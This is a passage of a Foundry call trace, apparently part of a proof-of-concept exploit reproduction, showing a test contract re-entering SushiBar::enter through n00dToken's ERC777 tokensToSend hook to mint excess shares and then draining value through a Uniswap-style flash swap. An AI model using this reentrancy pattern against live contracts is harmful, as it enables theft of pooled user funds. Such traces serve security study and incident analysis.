+    │   │   │   ├─ [72188] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4447106892913407811950 [4.447e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   ├─ [60844] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4447106892913407811950 [4.447e21], 0x, 0x)
+    │   │   │   │   │   ├─ [37972] SushiBar::enter(4447106892913407811950 [4.447e21])
+    │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 5969531502726155704734 [5.969e21]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10330302917372607682383 [1.033e22])
+    │   │   │   │   │   │   ├─ [32757] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4447106892913407811950 [4.447e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   ├─ [21413] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4447106892913407811950 [4.447e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   ├─ [18441] SushiBar::enter(4447106892913407811950 [4.447e21])
+    │   │   │   │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5969531502726155704734 [5.969e21]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18026042740296973609669 [1.802e22])
+    │   │   │   │   │   │   │   │   │   ├─ [13226] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4447106892913407811950 [4.447e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1882] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4447106892913407811950 [4.447e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4447106892913407811950 [4.447e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4447106892913407811950 [4.447e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000004b56407729cf1f16729 → 0x0000000000000000000000000000000000000000000003c45005f54a5b2785bb
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000001439be439cbc84d999e → 0x000000000000000000000000000000000000000000000234afe5b71e5f177b0c
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000370ef03a87c11090a92 → 0x000000000000000000000000000000000000000000000742209c46b79325f557
+    │   │   │   │   │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000051fba08126a7aa85688 → 0x0000000000000000000000000000000000000000000008f0eba0b0a5fcc5414d
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 37: 1 → 2
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4447106892913407811950 [4.447e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4447106892913407811950 [4.447e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000003c45005f54a5b2785bb → 0x0000000000000000000000000000000000000000000002d33c0477f7c45da44d
+    │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x000000000000000000000000000000000000000000000234afe5b71e5f177b0c → 0x000000000000000000000000000000000000000000000325c3e73470f5e15c7a
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000002efb847975b2aecff39 → 0x00000000000000000000000000000000000000000000051fba08126a7aa85688
+    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000140ed432d6cc14db343 → 0x000000000000000000000000000000000000000000000370ef03a87c11090a92
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 37: 0 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4447106892913407811950 [4.447e21], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4447106892913407811950 [4.447e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x000000000000000000000000000000000000000000000325c3e73470f5e15c7a → 0x000000000000000000000000000000000000000000000416d7e8b1c38cab3de8
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000002d33c0477f7c45da44d → 0x0000000000000000000000000000000000000000000001e22802faa52d93c2df
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6 → 0x0000000000000000000000000000000000000000000002efb847975b2aecff39
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000000140ed432d6cc14db343
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [490] SushiBar::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 34276400319812189156695 [3.427e22]
+    │   │   ├─ [15468] SushiBar::leave(34276400319812189156695 [3.427e22])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 19310852181466379140584 [1.931e22]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 34276400319812189156695 [3.427e22])
+    │   │   │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15676396144578420483356 [1.567e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 15676396144578420483356 [1.567e22], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 15676396144578420483356 [1.567e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000001e22802faa52d93c2df → 0x000000000000000000000000000000000000000000000533f9b5ff086976e7fb
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x000000000000000000000000000000000000000000000416d7e8b1c38cab3de8 → 0x0000000000000000000000000000000000000000000000c50635ad6050c818cc
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000742209c46b79325f557 → 0
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000008f0eba0b0a5fcc5414d → 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [12740] n00dToken::transfer(0x5476DB8B72337d44A6724277083b1a927c82a389, 20269730923373664773210 [2.026e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   ├─ [1771] ContractTest::tokensToSend(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5476DB8B72337d44A6724277083b1a927c82a389, 20269730923373664773210 [2.026e22], 0x, 0x)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, amount: 20269730923373664773210 [2.026e22], data: 0x, operatorData: 0x)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, value: 20269730923373664773210 [2.026e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x00000000000000000000000000000000000000000000044ae0e707df7d49a45a
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000533f9b5ff086976e7fb → 0x0000000000000000000000000000000000000000000000e926afaddc939143a1
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 38: 0x0000000000000000000000000000000000000000000000da6d35abf9e43f67f8 → 0x0000000000000000000000000000000000000000000000f114017d5296c9e16e
+    │   │   │   @ 37: 2 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [645] n00dToken::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 20270730923373664773210 [2.027e22]
+    │   ├─ [534] WETH9::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 75400440702963015319 [7.54e19]
+    │   ├─ emit Sync(reserve0: 20270730923373664773210 [2.027e22], reserve1: 75400440702963015319 [7.54e19])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 20269730923373664773210 [2.026e22], amount1In: 0, amount0Out: 20207921730603543777894 [2.02e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x635812f700000000000416642d54a803de970000000004478720aa8718955266 → 0x635812f700000000000416642d54a803de9700000000044ae0e707df7d49a45a
+    │   └─ ← [Stop]
+    ├─ [517] 0x5476DB8B72337d44A6724277083b1a927c82a389::getReserves() [staticcall]
+    │   └─ ← [Return] 20270730923373664773210 [2.027e22], 75400440702963015319 [7.54e19], 1666716407 [1.666e9]
+    ├─ [160007] 0x5476DB8B72337d44A6724277083b1a927c82a389::swap(20269730923373664773210 [2.026e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20269730923373664773210 [2.026e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: 0x5476DB8B72337d44A6724277083b1a927c82a389, from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 20269730923373664773210 [2.026e22], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20269730923373664773210 [2.026e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000e926afaddc939143a1 → 0x000000000000000000000000000000000000000000000533f9b5ff086976e7fb
+    │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x00000000000000000000000000000000000000000000044ae0e707df7d49a45a → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] true
+    │   ├─ [135842] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20269730923373664773210 [2.026e22], 0, 0x00)
+    │   │   ├─ [645] n00dToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 24570609930405236107259 [2.457e22]
+    │   │   ├─ [100103] SushiBar::enter(4914121986081047221451 [4.914e21])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3634456036887958657228 [3.634e21]
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10744715230583009038032 [1.074e22])
+    │   │   │   ├─ [72188] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4914121986081047221451 [4.914e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   ├─ [60844] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4914121986081047221451 [4.914e21], 0x, 0x)
+    │   │   │   │   │   ├─ [37972] SushiBar::enter(4914121986081047221451 [4.914e21])
+    │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 3634456036887958657228 [3.634e21]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 25272567765566244476233 [2.527e22])
+    │   │   │   │   │   │   ├─ [32757] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4914121986081047221451 [4.914e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   ├─ [21413] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4914121986081047221451 [4.914e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   ├─ [18441] SushiBar::enter(4914121986081047221451 [4.914e21])
+    │   │   │   │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3634456036887958657228 [3.634e21]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 59443425698912817495453 [5.944e22])
+    │   │   │   │   │   │   │   │   │   ├─ [13226] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4914121986081047221451 [4.914e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1882] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4914121986081047221451 [4.914e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4914121986081047221451 [4.914e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4914121986081047221451 [4.914e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000533f9b5ff086976e7fb → 0x000000000000000000000000000000000000000000000429949198d387925330
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000000c50635ad6050c818cc → 0x0000000000000000000000000000000000000000000001cf6b5a139532acad97
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000007a08035f94101332419 → 0x000000000000000000000000000000000000000000001436ef7591a5d9e0e1b6
+    │   │   │   │   │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000094f4b3a632f6ad2700f → 0x0000000000000000000000000000000000000000000015e5ba79fb9443802dac
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 37: 1 → 2
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4914121986081047221451 [4.914e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4914121986081047221451 [4.914e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000001cf6b5a139532acad97 → 0x0000000000000000000000000000000000000000000002d9d07e79ca14914262
+    │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000429949198d387925330 → 0x00000000000000000000000000000000000000000000031f2f6d329ea5adbe65
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000003f543e53034973f1ac6 → 0x00000000000000000000000000000000000000000000094f4b3a632f6ad2700f
+    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000024678e0c6462d9fced0 → 0x0000000000000000000000000000000000000000000007a08035f94101332419
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 37: 0 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4914121986081047221451 [4.914e21], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4914121986081047221451 [4.914e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000031f2f6d329ea5adbe65 → 0x000000000000000000000000000000000000000000000214ca48cc69c3c9299a
